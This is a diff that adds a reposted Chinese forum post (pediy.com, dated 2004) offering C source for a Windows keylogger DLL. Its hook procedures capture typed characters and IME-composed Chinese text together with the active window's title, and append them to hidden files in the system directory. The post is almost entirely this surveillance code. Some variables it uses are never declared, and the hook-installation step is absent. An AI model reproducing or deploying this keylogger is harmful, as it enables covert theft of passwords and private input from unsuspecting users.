@@ -1,0 +1,342 @@
+
+# 键盘记录代码.高手请飘过
+
+> 原文：`[www.pediy.com/kssd/pediy12/127710.html](https://www.pediy.com/kssd/pediy12/127710.html)`
+
+整理旧硬盘无意发现的.写于 2004 年 4 月 13 日.
+
+```c
+#include <windows.h>
+
+#include <stdio.h>
+
+#include <stdlib.h>
+
+#include <time.h>
+
+#pragma comment ( lib, "imm32.lib" )
+
+#include <imm.h>
+
+LRESULT CALLBACK SpyGetMsgProc(INT hc, WPARAM wParam, LPARAM lParam);
+
+LRESULT CALLBACK SpyCallWndProc(INT hc, WPARAM wParam, LPARAM lParam);
+
+int PutChars(unsigned char *ch)
+
+{
+
+  char temp[128];
+
+  FILE *fp;
+
+#ifndef _DEBUG
+
+  GetSystemDirectory(temp, sizeof(temp)-20);
+
+  strcat(temp, "\\\\1.dat");
+
+#else
+
+  strcpy(temp, "1.dat");
+
+#endif
+
+  fp =fopen(temp, "a");
+
+  if(fp ==NULL) fp=fopen(temp, "w");
+
+  if(fp ==NULL) return 0L;
+
+  fwrite(ch, strlen(ch), 1, fp);
+
+  fclose(fp);
+
+  return 0;
+
+}
+
+int PutChar(unsigned char ch)
+
+{
+
+  char temp[128];
+
+  FILE *fp;
+
+#ifndef _DEBUG
+
+  GetSystemDirectory(temp, sizeof(temp)-20);
+
+  strcat(temp, "\\\\1.dat");
+
+#else
+
+  strcpy(temp, "1.dat");
+
+#endif
+
+  fp =fopen(temp, "a");
+
+  if(fp ==NULL) fp=fopen(temp, "w");
+
+  if(fp ==NULL) return 0L;
+
+  fwrite(&ch, 1, 1, fp);
+
+  fclose(fp);
+
+  return 0;
+
+}
+
+int PutChar2(unsigned char ch)
+
+{
+
+  char temp[128];
+
+  FILE *fp;
+
+  int len;
+
+  char ch1;
+
+#ifndef _DEBUG
+
+  GetSystemDirectory(temp, sizeof(temp)-20);
+
+  strcat(temp, "\\\\2.dat");
+
+#else
+
+  strcpy(temp, "2.dat");
+
+#endif
+
+  fp =fopen(temp, "a");
+
+  if(fp ==NULL) fp=fopen(temp, "w");
+
+  if(fp ==NULL) return 0L;
+
+  fseek(fp,0,SEEK_END);
+
+  len=ftell(fp);
+
+  if(len%100==0) {ch1='\\r';fwrite(&ch1, 1, 1, fp);ch1='\\n';fwrite(&ch1, 1, 1, fp);}
+
+  fwrite(&ch, 1, 1, fp);
+
+  fclose(fp);
+
+  return 0;
+
+}
+
+BOOL APIENTRY DllMain(PVOID hModule, ULONG ulReason, PCONTEXT pctx)
+
+{
+
+    UNREFERENCED_PARAMETER(hModule);
+
+    UNREFERENCED_PARAMETER(pctx);
+
+    if ( ulReason == DLL_PROCESS_ATTACH ) {
+
+    }
+
+    return TRUE;
+
+}
+
+HWND GetTopParent(HWND hWnd)
+
+{
+
+  HWND hwnd;
+
+  if(hWnd ==NULL) return FALSE;
+
+  hwnd =hWnd;
+
+  while(hwnd !=NULL)
+
+  {
+
+    hWnd =hwnd;
+
+    hwnd =GetParent(hWnd);
+
+  }
+
+  return hWnd;
+
+}
+
+BOOL WINAPI HookProc(HWND hwnd, UINT uiMessage, WPARAM wParam, LPARAM lParam)
+
+{
+
+  HWND hWnd;
+
+  hWnd =GetTopParent(hwnd);
+
+  ///////////////////////////////////////
+
+  if(uiMessage ==WM_IME_COMPOSITION)
+
+  {
+
+    HIMC hIMC;
+
+    DWORD dwSize;
+
+    hIMC = ImmGetContext(hWnd);
+
+     if( lParam & GCS_RESULTSTR )
+
+    {
+
+      unsigned char str[ MAX_PATH ];
+
+      dwSize = ImmGetCompositionString( hIMC, GCS_RESULTSTR, (void*)str, sizeof( str ));//取得汉字输入串
+
+      str[ dwSize ] = 0;
+
+      if((GetTickCount()-tick)>=50) //防止 word 中重复记录，重复记录原因不明
+
+      {
+
+        char temp[100];
+
+        GetWindowText(hWnd, temp, sizeof(temp));
+
+        if(strcmp(temp, sOldCapText))
+
+          {strcpy(sOldCapText, temp);bChange=1;}
+
+        else bChange=0;
+
+        if(bFirst||bChange)
+
+        {
+
+          if(bChange) PutChars("\\r\\n");
+
+          GetWindowText(hWnd, sOldCapText, sizeof(sOldCapText));
+
+          PutChar('(');
+
+          PutChars(sOldCapText);
+
+          PutChar(')');
+
+        }
+
+        PutChars(str);
+
+        bFirst=0;
+
+      }
+
+      tick=GetTickCount();
+
+    }
+
+    ImmReleaseContext( hWnd, hIMC );
+
+  }
+
+  ///////////////////////////////////字符输入
+
+  if(uiMessage==WM_CHAR)
+
+  {
+
+    if((GetTickCount()-tick)>=50)
+
+    {
+
+      char temp[100];
+
+      GetWindowText(hWnd, temp, sizeof(temp));
+
+      if(strcmp(temp, sOldCapText))
+
+        {strcpy(sOldCapText, temp);bChange=1;}
+
+      else bChange=0;
+
+      if(bFirst||bChange)
+
+      {
+
+        if(bChange) PutChars("\\r\\n");
+
+        GetWindowText(hWnd, sOldCapText, sizeof(sOldCapText));
+
+        PutChar('(');
+
+        PutChars(sOldCapText);
+
+        PutChar(')');
+
+      }
+
+      PutChar((unsigned char)(wParam));
+
+      bFirst=0;
+
+    }
+
+    tick=GetTickCount();
+
+    }
+
+    return FALSE;
+
+}
+
+LRESULT CALLBACK SpyGetMsgProc(INT hc, WPARAM wParam, LPARAM lParam)
+
+{
+
+    PMSG pmsg;
+
+    pmsg = (PMSG)lParam;
+
+    if (hc >= 0 && pmsg && pmsg->hwnd)
+
+    {
+
+    HookProc(pmsg->hwnd, pmsg->message, pmsg->wParam, pmsg->lParam);
+
+//        return HookProc(pmsg->hwnd, pmsg->message, pmsg->wParam, pmsg->lParam);
+
+    }
+
+    return CallNextHookEx(NULL, hc, wParam, lParam);
+
+}
+
+LRESULT CALLBACK SpyCallWndProc(INT hc, WPARAM wParam, LPARAM lParam)
+
+{
+
+    PCWPSTRUCT pcwps;
+
+    pcwps = (PCWPSTRUCT)lParam;
+
+    if (hc >= 0 && pcwps && pcwps->hwnd)
+
+    {
+
+        return HookProc(pcwps->hwnd, pcwps->message, pcwps->wParam, pcwps->lParam);
+
+    }
+
+    return CallNextHookEx(NULL, hc, wParam, lParam);
+
+}
+```
